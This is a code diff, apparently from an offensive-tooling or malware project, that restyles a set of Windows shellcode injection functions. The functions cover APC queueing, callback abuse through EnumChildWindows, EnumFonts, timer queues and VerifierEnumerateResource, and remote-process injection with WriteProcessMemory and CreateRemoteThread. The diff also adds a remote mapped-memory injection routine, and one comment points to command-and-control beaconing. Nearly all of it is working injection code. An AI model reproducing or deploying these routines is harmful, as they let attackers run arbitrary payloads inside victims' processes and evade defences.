@@ -9,9 +9,9 @@ BOOLEAN APCPayloadInjection
 {
 	if (!sPayloadSize || !hThread || !pPayloadAddress) return FALSE;
 
-	PVOID pLocalPayloadAddress = NULL;
+	PVOID pLocalPayloadAddress = nullptr;
 
-	if (!(pLocalPayloadAddress = VirtualAlloc(0, sPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) return FALSE;
+	if ((pLocalPayloadAddress = VirtualAlloc(nullptr, sPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) == nullptr) return FALSE;
 
 	if (!memcpy(pLocalPayloadAddress, pPayloadAddress, sPayloadSize)) return FALSE;
 
@@ -19,8 +19,10 @@ BOOLEAN APCPayloadInjection
 
 	if (!VirtualProtect(pLocalPayloadAddress, sPayloadSize, PAGE_EXECUTE ,&dwOldProtections)) return FALSE;
 
-	if (!QueueUserAPC((PAPCFUNC)pLocalPayloadAddress, hThread, 0)) {
+	if (!QueueUserAPC((PAPCFUNC)pLocalPayloadAddress, hThread, 0)) 
+	{
 		printf("[!] Injection Failed With ErrorCode: 0x%lx", GetLastError());
+
 		return FALSE;
 	}
 	return TRUE;
@@ -36,15 +38,15 @@ BOOLEAN InjectCallbackPayloadEnumChildWindows
 {
 		if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;
 
-		PUCHAR pLocalPayload = NULL;
+		PUCHAR pLocalPayload = nullptr;
 
-		if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;
+		if ((pLocalPayload = static_cast<PUCHAR>(VirtualAlloc(nullptr, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) == nullptr) return FALSE;
 
 		if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;
 
 		if (!VirtualProtect(pLocalPayload, sPayloadSize, PAGE_EXECUTE, pdwOldProtections))return FALSE;
 
-		if (!EnumChildWindows(NULL, (WNDENUMPROC)pLocalPayload, NULL)) return  FALSE;
+		if (!EnumChildWindows(nullptr, (WNDENUMPROC)pLocalPayload, NULL)) return  FALSE;
 
 		*pInjectedPayloadAddress = pLocalPayload;
 
@@ -56,15 +58,14 @@ BOOLEAN InjectCallbackPayloadEnumDesktops
 	IN     LPVOID  pPayload,
 	IN     DWORD   sPayloadSize,
 	   OUT PDWORD  pdwOldProtections,
-	   OUT PVOID  *pInjectedPayloadAddress,
-	   OUT PHANDLE phMappedMemoryHandle 
+	   OUT PVOID * pInjectedPayloadAddress
 )
 {
 	if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;
 
-	PUCHAR pLocalPayload;
+	PUCHAR pLocalPayload = nullptr;
 
-	if (!(pLocalPayload = VirtualAlloc(pPayload, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;
+	if ((pLocalPayload = static_cast<PUCHAR>(VirtualAlloc(pPayload, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) == nullptr) return FALSE;
 
 	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;
 
@@ -74,7 +75,6 @@ BOOLEAN InjectCallbackPayloadEnumDesktops
 
 	return TRUE;
 }
-
 
 BOOLEAN InjectCallbackPayloadEnumFonts
 (
@@ -86,15 +86,15 @@ BOOLEAN InjectCallbackPayloadEnumFonts
 {
 	if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;
 
-	PUCHAR pLocalPayload = NULL;
+	PUCHAR pLocalPayload = nullptr;
 
-	if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;
+	if ((pLocalPayload = static_cast<PUCHAR>(VirtualAlloc(nullptr, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) == nullptr) return FALSE;
 
 	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;
 
 	if (!VirtualProtect(pLocalPayload, sPayloadSize, PAGE_EXECUTE, pdwOldProtections))return FALSE;
 
-	EnumFontsW( GetDC(NULL), NULL, (FONTENUMPROCW)pLocalPayload, NULL);
+	EnumFontsW( GetDC(nullptr), nullptr, (FONTENUMPROCW)pLocalPayload, NULL);
 
 	*pInjectedPayloadAddress = pLocalPayload;
 
@@ -111,9 +111,9 @@ BOOLEAN InjectCallbackPayloadEnumUILanguagesW
 {
 	if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;
 
-	PUCHAR pLocalPayload = NULL;
+	PUCHAR pLocalPayload = nullptr;
 
-	if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;
+	if ((pLocalPayload = static_cast<PUCHAR>(VirtualAlloc(nullptr, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) == nullptr) return FALSE;
 
 	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;
 
@@ -136,9 +136,9 @@ BOOLEAN InjectCallbackPayloadEnumThreadWindows
 {
 	if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;
 
-	PUCHAR pLocalPayload = NULL;
+	PUCHAR pLocalPayload = nullptr;
 
-	if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;
+	if ((pLocalPayload = static_cast<PUCHAR>(VirtualAlloc(nullptr, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) == nullptr) return FALSE;
 
 	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;
 
@@ -162,9 +162,9 @@ BOOLEAN InjectCallbackPayloadTimer //Possible beacon function 4 C2
 {
 	if (!sPayloadSize || !phTimerHandle || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;
 
-	PUCHAR pLocalPayload = NULL;
+	PUCHAR pLocalPayload = nullptr;
 
-	if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize,MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;
+	if ((pLocalPayload = static_cast<PUCHAR>(VirtualAlloc(nullptr, sPayloadSize,MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) == nullptr)  return FALSE;
 
 	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;
 
@@ -174,7 +174,7 @@ BOOLEAN InjectCallbackPayloadTimer //Possible beacon function 4 C2
 		phTimerHandle,
 		0,
 		(WAITORTIMERCALLBACK)pLocalPayload,
-		NULL,
+		nullptr,
 		NULL,
 		NULL,
 		NULL
@@ -193,15 +193,15 @@ BOOLEAN InjectCallbackPayloadEnumDisplayMonitors
 {
 	if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;
 
-	PUCHAR pLocalPayload = NULL;
+	PUCHAR pLocalPayload = nullptr;
 
-	if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;
+	if ((pLocalPayload = static_cast<PUCHAR>(VirtualAlloc(nullptr, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) == nullptr) return FALSE;
 
 	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;
 
 	if (!VirtualProtect(pLocalPayload, sPayloadSize, PAGE_EXECUTE, pdwOldProtections))return FALSE;
 
-	EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)pLocalPayload, NULL);
+	EnumDisplayMonitors(nullptr, nullptr, (MONITORENUMPROC)pLocalPayload, NULL);
 
 	*pInjectedPayloadAddress = pLocalPayload;
 
@@ -218,13 +218,15 @@ BOOLEAN InjectCallbackPayloadVerEnumResource
 )
 {
 	if (!sPayloadSize || !pdwOldProtections || !pPayload || !pInjectedPayloadAddress) return FALSE;
-	HMODULE hModule = { NULL };
-	if (!(hModule = LoadLibraryA("verifier.dll")))return FALSE;
 
-	
-	PUCHAR pLocalPayload = NULL;
+	HMODULE hModule = { };
 
-	if (!(pLocalPayload = VirtualAlloc(0, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;
+	PUCHAR pLocalPayload = nullptr;
+
+	if ((hModule = LoadLibraryA("verifier.dll")) == nullptr)return FALSE;
+
+
+	if ((pLocalPayload = static_cast<PUCHAR>(VirtualAlloc(nullptr, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) == nullptr) return FALSE;
 
 	if (!memcpy(pLocalPayload, pPayload, sPayloadSize)) return FALSE;
 
@@ -232,20 +234,53 @@ BOOLEAN InjectCallbackPayloadVerEnumResource
 
 	fnVerifierEnumerateResource pVerifierEnumerateResource;
 
-	if (!(pVerifierEnumerateResource = (fnVerifierEnumerateResource)GetProcAddress(hModule,(LPCSTR)"VerifierEnumerateResource")))return FALSE;
+	if ((pVerifierEnumerateResource = (fnVerifierEnumerateResource)GetProcAddress(hModule,(LPCSTR)"VerifierEnumerateResource")) == nullptr) return FALSE;
 
 	if (!pVerifierEnumerateResource(
 		GetCurrentProcess(),
 		NULL,
 		AvrfResourceHeapAllocation,
 		(AVRF_RESOURCE_ENUMERATE_CALLBACK)pLocalPayload,
-		NULL
+		nullptr
 	))return FALSE;
 
 	if (!EnumUILanguagesW((UILANGUAGE_ENUMPROCW)pLocalPayload, MUI_LANGUAGE_NAME, NULL)) return  FALSE;
 
 	return TRUE;
 }
+
+BOOLEAN InjectPayloadRemoteMappedMemory
+(
+	IN     PUCHAR  pPayload,
+	OUT PUCHAR* pRemoteMappedAddress,
+	OUT PUCHAR* pLocalMappedAddress,
+	IN	   SIZE_T  sPayloadSize,
+	OUT PHANDLE phRemoteFileMappingHandle,
+	IN     HANDLE  hProcess
+)
+{
+	if (!pPayload || !pRemoteMappedAddress || !sPayloadSize || !phRemoteFileMappingHandle) return FALSE;
+
+
+	PVOID pMapLocalAddress = nullptr, pMapRemoteAddress = nullptr;
+
+	HANDLE hFile = nullptr;
+
+	if ((hFile = CreateFileMapping(INVALID_HANDLE_VALUE, nullptr, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, nullptr)) == nullptr) return FALSE;
+
+	if ((pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize)) == nullptr) return FALSE;
+
+	memcpy_s(pMapLocalAddress, sPayloadSize, pPayload, sPayloadSize);
+
+	if ((pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, 0, nullptr, 0, 0, PAGE_EXECUTE_READWRITE)) == nullptr)  return FALSE;
+
+	*pLocalMappedAddress = static_cast<PUCHAR>(pMapLocalAddress);
+
+	*pRemoteMappedAddress = static_cast<PUCHAR>(pMapRemoteAddress);
+
+	return TRUE;
+}
+
 
 BOOLEAN InjectRemoteProcessShellcode
 (
@@ -258,35 +293,22 @@ BOOLEAN InjectRemoteProcessShellcode
 	SIZE_T  sBytesWritten;
 	DWORD   dwOldProtections;
 
-	if (!(*ppExternalAddress = VirtualAllocEx(
-		hProcessHandle, 
-		NULL, 
-		sShellCodeSize, 
-		MEM_COMMIT | MEM_RESERVE,
-		PAGE_READWRITE
-	)))return FALSE;
+	if ((*ppExternalAddress = VirtualAllocEx(hProcessHandle, nullptr, sShellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == nullptr)return FALSE;
 	
 	BOOLEAN bState = FALSE;
 
-	if (!WriteProcessMemory(
-		hProcessHandle, *ppExternalAddress, pShellcodeAddress,
-		sShellCodeSize, &sBytesWritten
-		))goto cleanup;
+	if (!WriteProcessMemory(hProcessHandle, *ppExternalAddress, pShellcodeAddress,sShellCodeSize, &sBytesWritten))goto EndOfFunc;
 
-	if (sBytesWritten != sShellCodeSize)goto cleanup;
+	if (sBytesWritten != sShellCodeSize)goto EndOfFunc;
 
-	if (!VirtualProtectEx(
-		hProcessHandle, *ppExternalAddress, 
-		sShellCodeSize, PAGE_EXECUTE, 
-		&dwOldProtections)) goto cleanup;
+	if (!VirtualProtectEx(hProcessHandle, *ppExternalAddress, sShellCodeSize, PAGE_EXECUTE, &dwOldProtections)) goto EndOfFunc;
 
 	bState = TRUE;
-	goto EndOfFunc;
-
-cleanup:
-	//VirtualFreeEx(hProcessHandle, *ppExternalAddress, sShellCodeSize, MEM_FREE);
 
 EndOfFunc:
+	VirtualFreeEx(hProcessHandle, *ppExternalAddress, sShellCodeSize, MEM_FREE);
+
+
 	return bState;
 }
 
@@ -306,9 +328,10 @@ BOOL InjectRemoteDll
 	LPVOID pTargetFunctionAddress;
 	DWORD dwOldProtections = 0;
 
-	if (!(*pRemoteFunctionAddress = GetProcAddress(LoadLibraryA(TargetDllName), TargetFunctionName))) return FALSE;
+	if ((*pRemoteFunctionAddress = reinterpret_cast<PVOID>(GetProcAddress(LoadLibraryA(TargetDllName), TargetFunctionName))) == nullptr) return FALSE;
 
 	if (!VirtualProtectEx(hProcess, *pRemoteFunctionAddress, sSizeToWrite, PAGE_READWRITE, &dwOldProtections)) return FALSE;
+
 	if (!WriteProcessMemory(hProcess, *pRemoteFunctionAddress, pPayload, sSizeToWrite, &BytesWritten) || sSizeToWrite != BytesWritten)
 	{
 		printf("Failed to write process memory with ErrorCode: 0x%lx", GetLastError());
@@ -334,24 +357,19 @@ BOOL InjectShellcode
 	SIZE_T sBytesWritten;
 	BOOL   state = FALSE;
 
-	if (
-		!(pExternalShellcode = VirtualAllocEx(hProcess,NULL,sShellcode,MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))
-		) goto _cleanup;
-	if (
-		!WriteProcessMemory(hProcess, pExternalShellcode, pLocalShellcode, sShellcode, &sBytesWritten) || sShellcode != sBytesWritten
-		) goto _cleanup;
-	if (
-		!VirtualProtectEx(hProcess, pExternalShellcode,sShellcode, PAGE_EXECUTE_READ, &dwOldProtection)
-		) goto _cleanup;
-	if (
-		!CreateRemoteThread(hProcess, NULL, 0, pExternalShellcode, NULL, 0, NULL)
-		) goto _cleanup;
+	if ((pExternalShellcode = VirtualAllocEx(hProcess,nullptr,sShellcode,MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) == nullptr) goto _cleanup;
+
+	if (!WriteProcessMemory(hProcess, pExternalShellcode, pLocalShellcode, sShellcode, &sBytesWritten) || sShellcode != sBytesWritten) goto _cleanup;
+
+	if (!VirtualProtectEx(hProcess, pExternalShellcode,sShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) goto _cleanup;
+
+	if (!CreateRemoteThread(hProcess, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(pExternalShellcode), nullptr, 0, nullptr)) goto _cleanup;
 
 	state = TRUE;
 
 _cleanup:
 	//if (pExternalShellcode) { 
-		//RtlSecureZeroMemory(pExternalShellcode, sShellcode);
+		//RtlSecureZeroMemoryEx(pExternalShellcode, sShellcode);
 		//VirtualFree(pExternalShellcode, sShellcode, MEM_FREE); 
 	//}
 	
